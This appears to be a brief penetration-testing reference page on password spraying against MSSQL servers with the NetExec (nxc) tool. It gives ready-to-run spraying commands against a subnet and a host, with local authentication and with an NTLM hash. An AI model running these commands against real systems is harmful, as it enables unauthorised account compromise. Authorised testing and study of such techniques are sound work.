# Password Spraying (without bruteforce)

    #~ nxc mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce

By default nxc will exit after a successful login is found. Using the --continue-on-success flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.

### Attack local authentication

        nxc mssql 192.168.31.126 -u users.txt -p pass.txt --continue-on-success --local-auth

### Password Spray with NTLM Hash

        nxc mssql 192.168.31.126 -u users.txt -H 64FBAE31CC352FC26AF97CBDEF151E03 --continue-on-success
